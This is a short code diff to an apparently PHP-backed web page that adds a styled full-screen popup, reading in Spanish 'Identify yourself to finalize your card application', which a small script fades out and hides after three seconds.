@@ -326,5 +326,21 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             }
         }, 1000);
     </script>
+
+<!-- Popup -->
+<div id="id-popup" style="position: fixed; inset: 0; background: rgba(0,0,0,0.55); z-index: 9999; display: flex; align-items: center; justify-content: center; transition: opacity 0.4s ease;">
+    <div style="background: #fff; border-radius: 10px; padding: 28px 24px; max-width: 300px; width: 88%; text-align: center; box-shadow: 0 6px 28px rgba(0,0,0,0.25);">
+        <p style="font-family: 'Segoe UI', sans-serif; font-size: 15px; color: #222; line-height: 1.6; font-weight: 500;">Identifícate para finalizar la solicitud de tu tarjeta</p>
+    </div>
+</div>
+<script>
+    (function () {
+        var p = document.getElementById('id-popup');
+        setTimeout(function () {
+            p.style.opacity = '0';
+            setTimeout(function () { p.style.display = 'none'; }, 400);
+        }, 3000);
+    })();
+</script>
 </body>
 </html>
